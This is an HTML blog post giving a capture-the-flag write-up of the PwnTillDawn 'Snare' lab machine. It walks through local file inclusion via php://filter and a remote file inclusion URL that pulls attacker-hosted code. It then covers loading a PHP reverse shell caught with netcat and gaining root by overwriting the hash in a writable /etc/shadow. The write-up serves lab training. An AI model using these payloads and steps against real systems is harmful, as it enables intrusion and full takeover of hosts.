@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html class="no-js">
+  <head>
+	<meta charset="utf-8">
+	<title>PwnTillDawn - Snare Write-Up | JLowborn Cybersecurity Blog</title>
+	<meta name="description"
+		content="Snare (10.150.150.18)">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
+
+	<!-- Canonical -->
+	<link rel="canonical" href="/2024/06/30/pwntilldawn-snare.html">
+
+	<!-- RSS -->
+	<link rel="alternate" type="application/atom+xml" title="JLowborn Cybersecurity Blog"
+		href="/feed.xml" />
+
+	<!-- Font Awesome -->
+	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css"
+		integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">
+
+	<!-- Google Fonts -->
+	
+	<link href="//fonts.googleapis.com/css2?family=Playfair+Display:400,700 T+Sans:400,700,700italic,400italic" rel="stylesheet"
+		type="text/css">
+	
+</head>
+  <body>
+    <header class="site-header">
+	<div class="branding">
+		
+		<h1 class="site-title">
+			<a href="/">JLowborn Cybersecurity Blog</a>
+		</h1>
+	</div>
+	<nav class="site-nav">
+		<ul>
+			
+			
+			
+			
+			
+			<li>
+				<a class="page-link" href="/curriculum/">
+					Curriculum
+				</a>
+			</li>
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			<!-- Social icons from Font Awesome, if enabled  -->
+			
+
+
+<li>
+	<a href="mailto:wjunior50@gmail.com" title="Email">
+		<i class="fas fa-fw fa-envelope"></i>
+	</a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<li>
+	<a href="https://github.com/jlowborn" title="Follow on GitHub">
+		<i class="fab fa-fw fa-github"></i>
+	</a>
+</li>
+
+
+
+
+
+
+
+<li>
+	<a href="https://www.linkedin.com/in/jlowborn/" title="Follow on LinkedIn">
+		<i class="fab fa-fw fa-linkedin"></i>
+	</a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            <!-- Search bar -->
+            
+		</ul>
+	</nav>
+
+</header>
+
+    <div class="content">
+      <article >
+  <header style="background-image: url('/')">
+    <h1 class="title">PwnTillDawn - Snare Write-Up</h1>
+    
+    <p class="meta">
+      June 30, 2024
+      
+    </p>
+  </header>
+  <section class="post-content"><h1 id="snare-1015015018">Snare (10.150.150.18)</h1>
+
+<p><img src="/assets/img/post/pwntilldawn_snare/1.png" alt="" /></p>
+
+<h2 id="scanning-target">Scanning Target</h2>
+
+<p>Let’s start as usual with Nmap:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sV -sC -oN nmap.txt 10.150.150.18
+</code></pre></div></div>
+
+<p><img src="/assets/img/post/pwntilldawn_snare/2.png" alt="" /></p>
+
+<p>We have only ports 22 and 80 available, and apart from bruteforce, there’s nothing interesting about SSH, to let’s work on HTTP first.</p>
+
+<h2 id="web-server-exploration">Web Server Exploration</h2>
+
+<p>Upon loading the website there’s nothing really interesting on the page itself, but there’s one thing that instantly draws attention, which is the URL.</p>
+
+<p><img src="/assets/img/post/pwntilldawn_snare/3.png" alt="" /></p>
+
+<p>I <em>always</em> recommend checking out the source-code for clues and/or interesting findings, but this time it’s quite obvious, we can try changing the page name to see how the server responds, and we’ll soon find out this is a LFI vulnerability. Interestingly enough, any other file apart from the web pages isn’t working, still, we don’t know the reason.</p>
+
+<h2 id="local-file-inclusion">Local File Inclusion</h2>
+
+<p>One cool trick I’ve learned is that you can use PHP wrappers to retrieve file contents by converting them into base64 strings, we can try reading the page index and have a peek on the code.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=index.php
+</code></pre></div></div>
+
+<p><img src="/assets/img/post/pwntilldawn_snare/4.png" alt="" /></p>
+
+<p>Yet, by some reason, even <code class="language-plaintext highlighter-rouge">index.php</code> isn’t working, but when we try to do the same with home page, it works like a charm. So we know this vulnerability <em>do</em> exist.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=index.php
+</code></pre></div></div>
+
+<p><img src="/assets/img/post/pwntilldawn_snare/5.png" alt="" /></p>
+
+<p>In this case, I can only assume that’s the page is appending the <code class="language-plaintext highlighter-rouge">.php</code> extension, and we can type <code class="language-plaintext highlighter-rouge">index</code> without the extension. Yes, we could try bypassing it somehow and accessing the server files, yet, understanding the code internal workings is our best bet to easily exploit the server.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=index
+</code></pre></div></div>
+
+<p><img src="/assets/img/post/pwntilldawn_snare/6.png" alt="" /></p>
+
+<p>It works! After decoding the contents of the Base64 string, we can confirm our previous theory.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
+	<span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php?page=home'</span><span class="p">);</span>
+<span class="p">}</span> 
+<span class="k">else</span> <span class="p">{</span>
+	<span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>
+	<span class="k">include</span> <span class="p">(</span><span class="nv">$page</span><span class="mf">.</span> <span class="s1">'.php'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>This code snippet adds the <code class="language-plaintext highlighter-rouge">.php</code> extension to whatever text we add in the URL, and using <code class="language-plaintext highlighter-rouge">%00</code> doesn’t work, but what we can do is try to reach external server and see if this escalates to a Remote File Inclusion vulnerability.</p>
+
+<h2 id="remote-file-inclusion">Remote File Inclusion</h2>
+
+<p>To test this theory, what we can do is to run a local server within our machine and perform a request to any file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -m http.server
+</code></pre></div></div>
+
+<p>Back to the web page, we’ll type the following URL:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.150.150.18/index.php?page=http://10.66.66.230:8000/random
+</code></pre></div></div>
+
+<p>And back to our terminal:</p>
+
+<p><img src="/assets/img/post/pwntilldawn_snare/7.png" alt="" /></p>
+
+<h2 id="uploading-a-shell">Uploading a Shell</h2>
+
+<p>Great, we can now try to use this and load a PHP reverse shell to get access. I’ll be using <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">Pentest Monkey’s PHP Shell</a>. Remember to change the shell options to your IP address and port before using it.</p>
+
+<p><img src="/assets/img/post/pwntilldawn_snare/8.png" alt="" /></p>
+
+<p>Now we just have to start a listener using <code class="language-plaintext highlighter-rouge">netcat</code> on the same port and request the file in our machine omitting the extension and voilá!</p>
+
+<p><img src="/assets/img/post/pwntilldawn_snare/9.png" alt="" /></p>
+
+<p>The first flag is available on the <code class="language-plaintext highlighter-rouge">/home/snare</code> directory inside the machine.</p>
+
+<p><img src="/assets/img/post/pwntilldawn_snare/10.png" alt="" /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Now, assuming the next one is inside <code class="language-plaintext highlighter-rouge">/root</code> folder, we must find a way to escalate our privileges. Looking for binaries, kernel and OS version, among other stuff would take too long, we can use <code class="language-plaintext highlighter-rouge">LINPEAS-ng</code> which a bash script that does this for us and list potential escalation methods.</p>
+
+<p>Normally it would take just a simple command to use it, but since PwnTillDawn machines can’t connect outside the VPN’s network, you must download and follow the same usage describe in <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">this page</a>.</p>
+
+<p>From the output, we can see the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file has read/write permissions to any user, which means we can easily root the machine by accessing the account hash and changing it inside the file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkpasswd -m sha-512 pwned
+</code></pre></div></div>
+
+<p>This command will generate a new hash on the attacker with whatever password you want, now back to the target, you can use <code class="language-plaintext highlighter-rouge">nano</code> to edit the file and change root’s password hash by simply deleting it and pasting the newly hash.</p>
+
+<p><img src="/assets/img/post/pwntilldawn_snare/11.png" alt="" /></p>
+
+<p>Notice only the hash should be replaced, the others values separated by <code class="language-plaintext highlighter-rouge">:</code> must stay the same.</p>
+
+<p>Once done, just use the <code class="language-plaintext highlighter-rouge">su</code> command to access root account, and type the password you’ve just created, which in my case was <code class="language-plaintext highlighter-rouge">pwned</code>.</p>
+
+<p><img src="/assets/img/post/pwntilldawn_snare/12.png" alt="" /></p>
+
+<p>Finally, the final flag is available inside <code class="language-plaintext highlighter-rouge">/root</code> by the name of <code class="language-plaintext highlighter-rouge">FLAG2.txt</code>.</p>
+</section>
+  
+
+</article>
+
+<!-- Disqus -->
+
+
+<!-- Post navigation -->
+
+
+    </div>
+    
+<script src="/assets/js/katex_init.js"></script>
+
+
+<script src="/assets/js/typewriter.js"></script>
+
+
+<footer class="site-footer">
+	<p class="text"><i>"The world is full of fascinating problems waiting to be solved."</i>
+</p>
+</footer>
+
+
+  </body>
+</html>
